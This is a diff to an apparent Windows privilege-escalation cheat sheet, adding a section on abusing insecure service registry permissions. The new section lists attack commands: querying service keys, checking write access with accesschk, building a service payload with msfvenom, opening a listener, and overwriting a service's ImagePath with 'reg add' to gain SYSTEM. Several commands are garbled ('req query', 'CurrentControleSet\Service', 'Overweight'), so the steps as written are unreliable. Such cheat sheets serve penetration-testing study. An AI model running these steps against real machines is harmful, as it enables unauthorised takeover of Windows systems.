@@ -13,7 +13,7 @@ Windows Privilege Escalation by @nickvourd
 - [Always Install Elevated](#always-install-elevated)
 - [Insecure Service Permissions](#insecure-service-permissions)
 - DLL Hijacking
-- Insecure Registry Permissions
+- [Insecure Registry Permissions](#insecure-registry-permissions)
 - [Token Manipulation](#token-manipulation)
 - [Autologon User Credentials](#autologon-user-credentials)
 - User Account Control (UAC) Bypass
@@ -222,6 +222,24 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
    * net start SERVICENAME
 
 * Stop and start the service again and you’re a Local Admin!
+
+# Insecure Registry Permissions
+Windows stores all the necessary data that is related to services in the registry key location below:
+
+* req query HKLM\SYSTEM\CurrentControlSet\Services
+  * If you find a vulnerable service use the follwing command to see its details:
+    * req query HKLM\SYSTEM\CurrentControlSet\Services\<servicename>
+
+ * Find from which group is accessible this service
+    * accesschk.exe –kvusw hklm\System\CurrentControleSet\Service
+ 
+ * generate a payload:
+   * msfvenom –p windows/exec CMD=<Command> -f exe-services –o <service binery>
+ 
+ * open a listener
+ 
+ * Overweight the imagepath subkey of the valuable services with the path of the custom binary 
+   * reg add HKLM\System\CurrentControleSet\Service\<Service nam> /v ImagePath /t REG_EXPAND_SZ /d <path_to_exe> /f 
 
 # Token Manipulation
 * whoami /priv
